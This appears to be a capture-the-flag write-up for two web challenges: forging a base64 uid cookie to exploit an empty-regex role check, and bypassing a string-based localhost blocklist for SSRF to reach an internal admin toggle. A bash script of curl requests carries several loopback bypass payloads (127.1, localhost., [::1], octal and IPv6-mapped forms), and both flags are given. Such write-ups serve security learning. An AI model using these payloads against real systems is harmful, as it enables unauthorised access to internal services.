---
layout: default
title: Full Weak Engineer CTF post-mortem
---
## > regex-auth (Web)
from the website source, upon logging in, the website sets a `uid` and `username` cookie, where `uid` is the base64 encoded user id string.
```python
@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")

        if username in USERS:
            user_id = f"user_{random.randint(10000, 99999)}"
        else:
            user_id = f"guest_{random.randint(10000, 99999)}"

        uid = base64.b64encode(user_id.encode()).decode()

        resp = make_response(redirect("/dashboard"))
        resp.set_cookie("username", username)
        resp.set_cookie("uid", uid)
        return resp

    return render_template_string(login_page)
```

the user's role is set to the flag and rendered in the dashboard template upon the condition that regex matches user_id to an empty string. the vulnerability lies here, that an empty regex will match everything, because 'an empty string' exists in every string.

```python
@app.route("/dashboard")
def dashboard():
    username = request.cookies.get("username")
    uid = request.cookies.get("uid")

    if not username or not uid:
        return redirect("/")

    try:
        user_id = base64.b64decode(uid).decode()
    except Exception:
        return redirect("/")

    if re.match(r"user.*", user_id, re.IGNORECASE):
        role = "USER"
    elif re.match(r"guest.*", user_id, re.IGNORECASE):
        role = "GUEST"
    elif re.match(r"", user_id, re.IGNORECASE): 
        role = f"{FLAG}"
    else:
        role = "OTHER"

    return render_template_string(dashboard_page, user=username, uid=user_id, role=role)
```

therefore to get the flag, we encode literally any base64 string that doesn't start with `user` or `guest`

![base64](/images/fwe_images/base64.png)

log in with any username, ctrl+shift+i to inspect, go to application and set `uid` to your new string

![cookie](/images/fwe_images/cookie.png)

refresh and get the flag

![flag](/images/fwe_images/flag.png)

flag: `fwectf{emp7y_regex_m47che5_every7h1ng}`


## > AED (Web)

When you visit the `/` endpoint, it resets your session index and returns to the html page
```ts
app.get("/", c => {
  getSession(c.get("sid")).idx = -1
  return c.html(PAGE)
})
```

When you visit the `/heartbeat` endpoint, if the variable `pwned` is false, it spits out a random character. However, if it is true, it spits out a part of the flag.
```ts
app.get("/heartbeat", c => {
  const s = getSession(c.get("sid"))
  if (!pwned) {
    const char = DUMMY[Math.floor(Math.random() * DUMMY.length)]
    return c.json({ pwned: false, char })
  }
  if (s.idx === -1) s.idx = 0
  const pos = s.idx
  const char = FLAG[pos]
  s.idx = (s.idx + 1) % FLAG_LEN
  return c.json({ pwned: true, char, pos, len: FLAG_LEN })
})
```

the endpoint `/fetch/` lets you fetch any url that you control.
```ts
app.get("/fetch", async c => {
  const raw = c.req.query("url")
  if (!raw) return c.text("missing url", 400)
  let u: URL
  try {
    u = new URL(raw)
  } catch {
    return c.text("bad url", 400)
  }
  if (!isAllowedURL(u)) return c.text("forbidden", 403)
  const r = await fetch(u.toString(), { redirect: "manual" }).catch(() => null)
  if (!r) return c.text("upstream error", 502)
  if (r.status >= 300 && r.status < 400) return c.text("redirect blocked", 403)
  return c.text(await r.text())
})
```

the blocklist check in `isAllowedURL` is weak.
it only checks the scheme to be `http` and only blocks three host-names:
```ts
const isAllowedURL = (u: URL) =>
  u.protocol === "http:" &&
  !["localhost", "0.0.0.0", "127.0.0.1"].includes(u.hostname)
```

this can be exploited by providing hostnames like `localhost.`, `127.1`, which can bypass the filter. this vulnerability was made possible because they didn't compare the IP, they only compared the string.

the admin `app2` is run on port `4000`, and includes a `toggle` function that we can pwn to trigger the flag to print.

```ts
app2.get("/toggle", c => {
  pwned = true
  sessions.forEach(s => (s.idx = -1))
  return c.text("OK")
})
```

we can use the `/fetch` endpoint to toggle the pwned mode
`/fetch?url=<filteredpayload>/toggle`

using this bash script
```bash
BASE="http://33ccdbc5ef884fe7821c6b91a3eb963d0.chal3.fwectf.com:8004"

# 1) Save sid cookie
curl -s -c cookiejar.txt "$BASE/"

# 2) Try SSRF toggle variants (stop when one returns OK)
curl -s "$BASE/fetch" --get --data-urlencode "url=http://127.1:4000/toggle"
curl -s "$BASE/fetch" --get --data-urlencode "url=http://127.0.0.1:4000/toggle"
curl -s "$BASE/fetch" --get --data-urlencode "url=http://localhost.:4000/toggle"
curl -s "$BASE/fetch" --get --data-urlencode "url=http://[::1]:4000/toggle"
curl -s "$BASE/fetch" --get --data-urlencode "url=http://[::ffff:127.0.0.1]:4000/toggle"
curl -s "$BASE/fetch" --get --data-urlencode "url=http://0177.0.0.1:4000/toggle"

# 3) If one returns OK, poll heartbeat with same cookiejar
for i in $(seq 1 300); do
  curl -s -b cookiejar.txt "$BASE/heartbeat"
  echo
  sleep 0.1
done
```

revisit the webpage, and the flag will show itself:
![flag](/images/fwe_images/pwned.png)

flag: `fwectf{7h3_fu11_w34k_h34r7_l1v3d_4g41n}`

